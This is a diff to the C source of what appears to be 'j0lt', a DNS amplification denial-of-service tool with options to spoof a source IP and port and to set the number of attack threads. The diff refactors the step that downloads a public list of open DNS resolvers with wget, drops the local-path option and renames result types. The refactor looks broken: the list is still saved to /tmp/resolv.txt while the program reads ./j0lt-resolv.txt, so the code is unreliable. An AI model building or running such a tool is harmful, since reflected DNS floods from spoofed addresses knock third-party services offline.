@@ -41,6 +41,7 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <linux/wait.h>
 #include <unistd.h>
 #include <wait.h>
 
@@ -55,7 +56,7 @@
 
 #include "io.h"
 #include "result.h"
-#include <linux/wait.h>
+#include "process_control.h"
 
 typedef struct __attribute__((packed, aligned(1))) {
   uint32_t sourceaddr;
@@ -76,8 +77,8 @@ typedef struct __attribute__((packed, aligned(1))) {
 
 #define CHECK_SUCCESS(X, MSG)             \
   do {                                    \
-    C_Result r = X;                       \
-    if (r != C_SUCCESS) {                 \
+    Result_T r = X;                       \
+    if (r != RESULT_SUCCESS) {            \
       printf("%s [error: %i]\n", MSG, r); \
       exit(1);                            \
     }                                     \
@@ -125,7 +126,6 @@ typedef struct __attribute__((packed, aligned(1))) {
                                                                            \
     return data == 0;                                                      \
   }
-
 DEFINE_INSERT_FN(byte, uint8_t)
 DEFINE_INSERT_FN(word, uint16_t)
 DEFINE_INSERT_FN(dword, uint32_t)
@@ -171,10 +171,9 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define MAX_LINE_SZ_J0LT 0x30
 
 char **environ;
+
 const char *g_args = "xdt:p:m:r:";
-const char *g_path = "/tmp/resolv.txt";
-char *g_wget[] = {"/bin/wget", "-O", "/tmp/resolv.txt",
-                  "https://public-dns.info/nameservers.txt", NULL};
+const char *g_path = "./j0lt-resolv.txt";
 
 const char *g_menu = {
     " =========================================================\n"
@@ -184,8 +183,6 @@ const char *g_menu = {
     " -m <nthreads>                    : nthreads of attack    \n"
     " -x [hexdump]                     : print hexdump         \n"
     " -d [debug]                       : offline debug mode    \n"
-    " -r [resolv]<path>                : will not download list\n"
-    "                                  : provide absolute path \n"
     " =========================================================\n"
     "           7etsuo: https://github.com/7etsuo           \n"};
 
@@ -243,16 +240,6 @@ Result_T parse_opts(JoltOptions *opts, int argc, const char **argv) {
         if (errno != 0 || endptr == optarg || *endptr != '\0')
           err_exit("* nthreads invalid");
         break;
-      case 'r':  // resolv list path
-        while (*optarg == ' ') optarg++;
-        size_t pathsz = strlen(optarg);
-        if (pathsz >= PATH_MAX) {
-          err_exit("* path size invalid");
-        }
-        if (realpath(optarg, opts->resolv_path) == NULL) {
-          err_exit("* invalid file path");
-        }
-        break;
       case 'x':  // hex mode
         opts->hex_mode = true;
         break;
@@ -273,23 +260,35 @@ Result_T parse_opts(JoltOptions *opts, int argc, const char **argv) {
 
 void init_opts(JoltOptions *opts) {
   assert(opts != NULL);
-
   opts->spoof_ip = 0;
   opts->spoof_port = 0;
   opts->nthreads = 0;
-  opts->resolv_path[0] = '\0';
   opts->debug_mode = false;
   opts->hex_mode = false;
 }
 
+Result_T do_wget_resolv_list() {
+  char *g_wget[] = {"/bin/wget", "-O", "/tmp/resolv.txt",
+                    "https://public-dns.info/nameservers.txt", NULL};
+
+  posix_spawnattr_t attr = {0};
+  posix_spawn_file_actions_t *file_actionsp = NULL;
+
+  int status = init_spawnattr(&attr);
+  if (status != 0) return status;
+
+  status = spawn_process(g_wget[0], file_actionsp, &attr, environ);
+  if (status != 0) return status;
+
+  status = destroy_spawnattr(&attr);
+  if (status != 0) return status;
+
+  return status;
+}
+
 int main(int argc, char **argv) {
-  int status, i, s, nread;
+  int i, nread;
   size_t szpayload, szpewpew;
-  pid_t child_pid;
-  sigset_t mask;
-  posix_spawnattr_t attr;
-  posix_spawnattr_t *attrp;
-  posix_spawn_file_actions_t *file_actionsp;
 
   printf("%s", g_menu);
 
@@ -297,44 +296,13 @@ int main(int argc, char **argv) {
   init_opts(&opts);
   parse_opts(&opts, argc, (const char **)argv);
 
-  attrp = NULL;
-  file_actionsp = NULL;
-  if (opts.resolv_path[0] == '\0') {
-    strncpy(opts.resolv_path, g_path, strlen(g_path));
-    s = posix_spawnattr_init(&attr);
-    if (s != 0) err_exit("* posix_spawnattr_init");
-    s = posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGMASK);
-    if (s != 0) err_exit("* posix_spawnattr_setflags");
+  CHECK_SUCCESS(do_wget_resolv_list(), "* wget error");
 
-    sigfillset(&mask);
-    s = posix_spawnattr_setsigmask(&attr, &mask);
-    if (s != 0) err_exit("* posix_spawnattr_setsigmask");
-
-    attrp = &attr;
-
-    s = posix_spawnp(&child_pid, g_wget[0], file_actionsp, attrp, &g_wget[0],
-                     environ);
-    if (s != 0) err_exit("* posix_spawn");
-
-    if (attrp != NULL) {
-      s = posix_spawnattr_destroy(attrp);
-      if (s != 0) err_exit("* posix_spawnattr_destroy");
-    }
-
-    if (file_actionsp != NULL) {
-      s = posix_spawn_file_actions_destroy(file_actionsp);
-      if (s != 0) err_exit("* posix_spawn_file_actions_destroy");
-    }
-    do {
-      s = waitpid(child_pid, &status, WUNTRACED | WCONTINUED);
-      if (s == -1) err_exit("* waitpid");
-    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
-  }
-  printf("+ resolv list saved to %s\n", opts.resolv_path);
+  printf("+ resolv list saved to %s\n", g_path);
 
   void *resolvlist = NULL;
   size_t szresolvlist = 0;
-  if (read_file_into_mem(opts.resolv_path, &resolvlist, &szresolvlist) == false)
+  if (read_file_into_mem(g_path, &resolvlist, &szresolvlist) == false)
     err_exit("* file read error");
 
   char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT];
